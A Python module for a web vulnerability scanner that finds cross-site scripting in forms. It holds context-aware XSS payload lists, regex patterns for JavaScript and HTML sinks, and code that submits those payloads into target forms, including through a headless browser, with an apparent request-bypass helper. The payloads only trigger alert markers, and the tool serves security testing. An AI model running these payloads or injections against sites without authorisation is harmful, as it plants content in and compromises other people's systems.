#!/usr/bin/env python3
"""
Advanced Form-based XSS Detection Module
Handles POST forms, stored XSS, and JavaScript/HTML source analysis for XSS sinks.
"""

import asyncio
import logging
import re
import time
import uuid
from typing import List, Dict, Set, Optional, Tuple
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import aiohttp

logger = logging.getLogger(__name__)

class FormXSSDetector:
    def __init__(self, asset_manager, config):
        self.asset_manager = asset_manager
        self.config = config
        
        # XSS payloads for different contexts
        self.xss_payloads = self._load_context_aware_payloads()
        
        # JavaScript XSS sink patterns
        self.js_xss_sinks = [
            r'innerHTML\s*=',
            r'outerHTML\s*=',
            r'document\.write\s*\(',
            r'document\.writeln\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'Function\s*\(',
            r'insertAdjacentHTML\s*\(',
            r'\.html\s*\(',  # jQuery
            r'\.append\s*\(',  # jQuery
            r'\.prepend\s*\(',  # jQuery
            r'dangerouslySetInnerHTML',  # React
            r'v-html',  # Vue.js
            r'\[innerHTML\]',  # Angular
        ]
        
        # HTML XSS sink patterns
        self.html_xss_sinks = [
            r'<script[^>]*>.*?</script>',
            r'<iframe[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>',
            r'<link[^>]*>',
            r'<meta[^>]*>',
            r'on\w+\s*=',  # Event handlers
            r'javascript:',  # JavaScript URLs
            r'data:.*base64',  # Data URLs
        ]
        
    def _load_context_aware_payloads(self) -> Dict[str, List[str]]:
        """Load XSS payloads for different injection contexts."""
        return {
            'html_context': [
                '<script>alert("XSS_FORM_TEST")</script>',
                '<img src=x onerror=alert("XSS_FORM_TEST")>',
                '<svg onload=alert("XSS_FORM_TEST")>',
                '<details ontoggle=alert("XSS_FORM_TEST")>',
                '<video><source onerror="javascript:alert(\'XSS_FORM_TEST\')">',
            ],
            'attribute_context': [
                '" onmouseover="alert(\'XSS_FORM_TEST\')"',
                '\' onmouseover=\'alert("XSS_FORM_TEST")\'',
                '"><script>alert("XSS_FORM_TEST")</script>',
                '\';alert("XSS_FORM_TEST");//',
                '"><img src=x onerror=alert("XSS_FORM_TEST")>',
            ],
            'javascript_context': [
                '\';alert("XSS_FORM_TEST");//',
                '";alert("XSS_FORM_TEST");//',
                '</script><script>alert("XSS_FORM_TEST")</script>',
                '-alert("XSS_FORM_TEST")-',
                '/**/alert("XSS_FORM_TEST")/**/'
            ],
            'css_context': [
                '/*</style><script>alert("XSS_FORM_TEST")</script>',
                'expression(alert("XSS_FORM_TEST"))',
                'behavior:url(javascript:alert("XSS_FORM_TEST"))',
            ],
            'url_context': [
                'javascript:alert("XSS_FORM_TEST")',
                'data:text/html,<script>alert("XSS_FORM_TEST")</script>',
                'vbscript:alert("XSS_FORM_TEST")',
            ]
        }
    
    async def analyze_page_for_xss_sinks(self, url: str, session: aiohttp.ClientSession) -> Dict[str, List[str]]:
        """Analyze JavaScript and HTML source for XSS sinks."""
        sinks = {
            'js_sinks': [],
            'html_sinks': [],
            'form_sinks': [],
            'dangerous_patterns': []
        }
        
        try:
            try:
                from modules.http_bypass import smart_request as _smart_request
                _r, html = await _smart_request(session, 'GET', url, timeout=20)
            except Exception:
                async with session.get(url, timeout=15) as response:
                    html = await response.text()
            
            # Parse HTML
            soup = BeautifulSoup(html, 'html.parser')
            
            # Find JavaScript XSS sinks
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    js_content = script.string
                    for pattern in self.js_xss_sinks:
                        matches = re.findall(pattern, js_content, re.IGNORECASE)
                        if matches:
                            sinks['js_sinks'].append(f"JavaScript sink: {pattern} in script block")
                            logger.info(f"🔍 Found JS XSS sink: {pattern}")
            
            # Find HTML XSS sinks
            for pattern in self.html_xss_sinks:
                matches = re.findall(pattern, html, re.IGNORECASE | re.DOTALL)
                if matches:
                    sinks['html_sinks'].append(f"HTML sink: {pattern}")
                    logger.info(f"🔍 Found HTML XSS sink: {pattern}")
            
            # Analyze forms for dangerous patterns
            forms = soup.find_all('form')
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'GET').upper()
                
                # Check for dangerous form patterns
                if form_method == 'POST':
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for inp in inputs:
                        name = inp.get('name', '')
                        input_type = inp.get('type', 'text')
                        
                        # Look for potentially dangerous input names
                        dangerous_names = ['content', 'message', 'comment', 'post', 'text', 'data', 'html', 'code']
                        if any(danger in name.lower() for danger in dangerous_names):
                            sinks['form_sinks'].append(f"Dangerous form input: {name} ({input_type}) in {form_method} form")
                            logger.info(f"🔍 Found dangerous form input: {name}")
            
            # Check for dangerous JavaScript patterns that indicate XSS sinks
            dangerous_js_patterns = [
                r'\.innerHTML\s*=\s*[^;]+;',
                r'document\.write\s*\([^)]*[a-zA-Z_$][a-zA-Z0-9_$]*',  # Variables in document.write
                r'eval\s*\([^)]*[a-zA-Z_$][a-zA-Z0-9_$]*',  # Variables in eval
                r'Function\s*\([^)]*[a-zA-Z_$][a-zA-Z0-9_$]*',  # Variables in Function constructor
            ]
            
            for pattern in dangerous_js_patterns:
                matches = re.findall(pattern, html, re.IGNORECASE)
                if matches:
                    sinks['dangerous_patterns'].append(f"Dangerous pattern: {pattern}")
                    logger.info(f"🔍 Found dangerous JS pattern: {pattern}")
                    
        except Exception as e:
            logger.debug(f"XSS sink analysis failed: {e}")
            
        return sinks
    
    async def discover_forms(self, url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Discover all forms on a page and extract their details."""
        forms = []
        
        try:
            async with session.get(url, timeout=10) as response:
                html = await response.text()
                
            soup = BeautifulSoup(html, 'html.parser')
            form_elements = soup.find_all('form')
            
            for i, form in enumerate(form_elements):
                form_action = form.get('action', '')
                if not form_action or form_action == '?':
                    form_action = url  # Default to current URL
                elif not form_action.startswith('http'):
                    form_action = urljoin(url, form_action)
                
                form_method = form.get('method', 'GET').upper()
                form_enctype = form.get('enctype', 'application/x-www-form-urlencoded')
                
                # Extract all form inputs
                inputs = []
                form_inputs = form.find_all(['input', 'textarea', 'select'])
                
                for inp in form_inputs:
                    input_type = inp.get('type', 'text')
                    input_name = inp.get('name', f'unnamed_{len(inputs)}')
                    input_value = inp.get('value', '')
                    
                    # Skip submit buttons and hidden CSRF tokens
                    if input_type in ['submit', 'button', 'image', 'reset']:
                        continue
                    
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': input_value,
                        'element': inp.name
                    })
                
                if inputs:  # Only include forms with testable inputs
                    # Check for JavaScript form handlers that might override submission
                    form_id = form.get('id', '')
                    js_handler_detected = False
                    if form_id:
                        # Look for JavaScript that handles this form
                        js_patterns = [
                            f'getElementById\s*\(\s*[\'\"]{form_id}[\'\"]\s*\)',
                            f'#{form_id}.*onsubmit',
                            f'{form_id}.*addEventListener',
                            f'{form_id}.*submit'
                        ]
                        for pattern in js_patterns:
                            if re.search(pattern, html, re.IGNORECASE):
                                js_handler_detected = True
                                break
                    
                    forms.append({
                        'id': i,
                        'action': form_action,
                        'method': form_method,
                        'enctype': form_enctype,
                        'inputs': inputs,
                        'element_html': str(form),
                        'js_handler': js_handler_detected,
                        'form_id': form_id
                    })
                    
                    handler_note = " [JS-handled]" if js_handler_detected else ""
                    logger.info(f"🔍 Found form: {form_method} {form_action} with {len(inputs)} inputs{handler_note}")
            
        except Exception as e:
            logger.debug(f"Form discovery failed: {e}")
            
        return forms
    
    async def test_stored_xss_in_form(self, form: Dict, url: str, session: aiohttp.ClientSession, 
                                     auth_headers: Dict = None) -> List[Dict]:
        """Test a form for stored XSS vulnerabilities."""
        findings = []
        
        try:
            # Generate unique marker for this test
            test_marker = f"XSS_STORED_{int(time.time())}_{uuid.uuid4().hex[:8]}"
            
            for context, payloads in self.xss_payloads.items():
                for payload in payloads[:2]:  # Limit payloads to avoid noise
                    # Customize payload with unique marker
                    test_payload = payload.replace('XSS_FORM_TEST', test_marker)
                    
                    # Test each input field
                    for input_field in form['inputs']:
                        if input_field['type'] in ['hidden', 'password']:
                            continue
                        
                        # Prepare form data
                        form_data = {}
                        for inp in form['inputs']:
                            if inp['name'] == input_field['name']:
                                form_data[inp['name']] = test_payload
                            else:
                                # Use default values for other fields
                                form_data[inp['name']] = inp['value'] if inp['value'] else 'test'
                        
                        # Submit form
                        submission_result = await self._submit_form_data(
                            form, form_data, session, auth_headers
                        )
                        
                        if not submission_result:
                            continue
                        
                        # Wait a moment for processing
                        await asyncio.sleep(1)
                        
                        # Check for stored XSS by revisiting the page
                        xss_detected = await self._check_stored_xss(
                            url, test_marker, session, auth_headers
                        )
                        
                        if xss_detected:
                            finding = {
                                'form_id': form['id'],
                                'form_action': form['action'],
                                'form_method': form['method'],
                                'vulnerable_input': input_field['name'],
                                'payload': test_payload,
                                'context': context,
                                'marker': test_marker,
                                'evidence': f"Stored XSS in form field '{input_field['name']}' - marker '{test_marker}' found in page content after form submission"
                            }
                            findings.append(finding)
                            logger.info(f"🚨 STORED XSS FOUND: {input_field['name']} in form {form['id']}")
                            
                            # Don't test more payloads for this field once we find XSS
                            break
                    
                    if findings:  # If we found XSS, don't need to test more contexts
                        break
                        
        except Exception as e:
            logger.debug(f"Stored XSS testing failed: {e}")
            
        return findings
    
    async def test_js_form_xss(self, form: Dict, url: str, session: aiohttp.ClientSession) -> List[Dict]:
        """Test JavaScript-handled forms for XSS using browser automation."""
        findings = []
        
        if not form.get('js_handler'):
            return findings
            
        try:
            from playwright.async_api import async_playwright
            
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context()
                page = await context.new_page()
                
                # Navigate to the page
                await page.goto(url)
                await page.wait_for_load_state('networkidle')
                
                # Generate unique test marker
                test_marker = f"XSS_JS_TEST_{int(time.time())}_{uuid.uuid4().hex[:8]}"
                
                # Test XSS payloads in form inputs
                for input_field in form['inputs']:
                    if input_field['type'] in ['hidden', 'password', 'submit', 'button']:
                        continue
                        
                    input_name = input_field['name']
                    
                    # Try different XSS payloads
                    payloads = [
                        f'<script>alert("{test_marker}")</script>',
                        f'<img src=x onerror=alert("{test_marker}")>',
                        f'<svg onload=alert("{test_marker}")>',
                        f'"><script>alert("{test_marker}")</script>',
                    ]
                    
                    for payload in payloads:
                        try:
                            # Fill the form field
                            if input_field['element'] == 'textarea':
                                await page.fill(f'textarea[name="{input_name}"]', payload)
                            else:
                                await page.fill(f'input[name="{input_name}"]', payload)
                            
                            # Set up dialog handler before submitting
                            dialog_detected = False
                            
                            async def handle_dialog(dialog):
                                nonlocal dialog_detected
                                if test_marker in dialog.message:
                                    dialog_detected = True
                                await dialog.accept()
                            
                            page.on('dialog', handle_dialog)
                            
                            # Submit the form (this will trigger JS handler)
                            if form.get('form_id'):
                                submit_button = page.locator(f'#{form["form_id"]} input[type="submit"], #{form["form_id"]} button[type="submit"]').first
                                if await submit_button.count() > 0:
                                    await submit_button.click()
                                else:
                                    # Try to trigger form submission via JavaScript
                                    await page.evaluate(f'document.getElementById("{form["form_id"]}").submit()')
                            
                            # Wait a moment for any XSS to execute
                            await page.wait_for_timeout(2000)
                            
                            # Check if our payload appears in the DOM (for DOM-based XSS)
                            page_content = await page.content()
                            if test_marker in page_content:
                                # Verify it's in an executable context
                                if any(pattern in page_content for pattern in ['<script>', 'onerror=', 'onload=', 'javascript:']):
                                    dialog_detected = True
                            
                            if dialog_detected:
                                finding = {
                                    'form_id': form['id'],
                                    'form_action': form['action'],
                                    'form_method': 'JavaScript-handled',
                                    'vulnerable_input': input_name,
                                    'payload': payload,
                                    'context': 'dom_xss',
                                    'marker': test_marker,
                                    'evidence': f"DOM-based XSS in JS-handled form field '{input_name}' - payload executed in browser context"
                                }
                                findings.append(finding)
                                logger.info(f"🚨 DOM XSS FOUND in JS form: {input_name}")
                                break  # Found XSS, no need to test more payloads
                            
                        except Exception as e:
                            logger.debug(f"JS form XSS test failed for {input_name}: {e}")
                            continue
                
                await browser.close()
                
        except Exception as e:
            logger.debug(f"JavaScript form XSS testing failed: {e}")
            
        return findings
    
    async def _submit_form_data(self, form: Dict, form_data: Dict, session: aiohttp.ClientSession, 
                               auth_headers: Dict = None) -> bool:
        """Submit form data and return success status."""
        try:
            headers = {'User-Agent': 'ModScan/1.0'}
            if auth_headers:
                headers.update(auth_headers)
            
            if form['method'] == 'POST':
                if form['enctype'] == 'multipart/form-data':
                    # Use FormData for multipart
                    data = aiohttp.FormData()
                    for key, value in form_data.items():
                        data.add_field(key, value)
                    try:
                        from modules.http_bypass import smart_request as _smart_request
                        r, _t = await _smart_request(session, 'POST', form['action'], data=data, headers=headers, timeout=20)
                        return getattr(r, 'status', 500) < 400
                    except Exception:
                        async with session.post(form['action'], data=data, headers=headers, timeout=15) as resp:
                            return resp.status < 400
                else:
                    # Regular POST
                    try:
                        from modules.http_bypass import smart_request as _smart_request
                        r, _t = await _smart_request(session, 'POST', form['action'], data=form_data, headers=headers, timeout=20)
                        return getattr(r, 'status', 500) < 400
                    except Exception:
                        async with session.post(form['action'], data=form_data, headers=headers, timeout=15) as resp:
                            return resp.status < 400
            else:
                # GET method
                try:
                    from modules.http_bypass import smart_request as _smart_request
                    r, _t = await _smart_request(session, 'GET', form['action'], params=form_data, headers=headers, timeout=20)
                    return getattr(r, 'status', 500) < 400
                except Exception:
                    async with session.get(form['action'], params=form_data, headers=headers, timeout=15) as resp:
                        return resp.status < 400
                    
        except Exception as e:
            logger.debug(f"Form submission failed: {e}")
            return False
    
    async def _check_stored_xss(self, url: str, marker: str, session: aiohttp.ClientSession, 
                               auth_headers: Dict = None) -> bool:
        """Check if stored XSS payload is present on the page."""
        try:
            headers = {'User-Agent': 'ModScan/1.0'}
            if auth_headers:
                headers.update(auth_headers)
                
            try:
                from modules.http_bypass import smart_request as _smart_request
                r, content = await _smart_request(session, 'GET', url, headers=headers, timeout=20)
            except Exception:
                async with session.get(url, headers=headers, timeout=15) as resp:
                    content = await resp.text()
                
                # Check if our marker is present in the content
                if marker in content:
                    # Additional verification - check if it's in an executable context
                    dangerous_contexts = [
                        f'<script>{marker}',
                        f'<script[^>]*>{marker}',
                        f'{marker}</script>',
                        f'alert("{marker}")',
                        f"alert('{marker}')",
                        f'onerror=.*{marker}',
                        f'onload=.*{marker}',
                        f'javascript:.*{marker}',
                    ]
                    
                    for context_pattern in dangerous_contexts:
                        if re.search(context_pattern, content, re.IGNORECASE):
                            return True
                    
                    # Even if not in obvious dangerous context, presence indicates reflection
                    return True
                    
        except Exception as e:
            logger.debug(f"Stored XSS check failed: {e}")
            
        return False
    
    async def comprehensive_form_xss_scan(self, url: str, session: aiohttp.ClientSession, 
                                         auth_headers: Dict = None) -> Dict:
        """Perform comprehensive form-based XSS scanning."""
        results = {
            'xss_sinks': {},
            'forms_found': [],
            'stored_xss_findings': [],
            'recommendations': []
        }
        
        try:
            # Step 1: Analyze page for XSS sinks
            logger.info(f"🔍 Analyzing XSS sinks in {url}")
            results['xss_sinks'] = await self.analyze_page_for_xss_sinks(url, session)
            
            # Step 2: Discover forms
            logger.info(f"🔍 Discovering forms in {url}")
            forms = await self.discover_forms(url, session)
            results['forms_found'] = forms
            
            # Step 3: Test each form for stored XSS and JavaScript form XSS
            for form in forms:
                logger.info(f"🔍 Testing form {form['id']} for stored XSS")
                form_findings = await self.test_stored_xss_in_form(form, url, session, auth_headers)
                results['stored_xss_findings'].extend(form_findings)
                
                # Test JavaScript-handled forms
                if form.get('js_handler'):
                    logger.info(f"🔍 Testing JavaScript-handled form {form['id']} for DOM XSS")
                    js_findings = await self.test_js_form_xss(form, url, session)
                    results['stored_xss_findings'].extend(js_findings)
            
            # Step 4: Generate recommendations
            results['recommendations'] = self._generate_recommendations(results)
            
        except Exception as e:
            logger.error(f"Comprehensive form XSS scan failed: {e}")
            
        return results
    
    def _generate_recommendations(self, results: Dict) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []
        
        if results['stored_xss_findings']:
            recommendations.append("🚨 CRITICAL: Stored XSS vulnerabilities found - implement proper input validation and output encoding")
        
        if results['xss_sinks']['js_sinks']:
            recommendations.append("⚠️ JavaScript XSS sinks detected - review innerHTML/document.write usage")
            
        if results['xss_sinks']['form_sinks']:
            recommendations.append("⚠️ Dangerous form inputs detected - implement CSRF protection and input validation")
            
        if results['forms_found']:
            recommendations.append("💡 Forms found - ensure all user inputs are properly validated and encoded")
            
        return recommendations
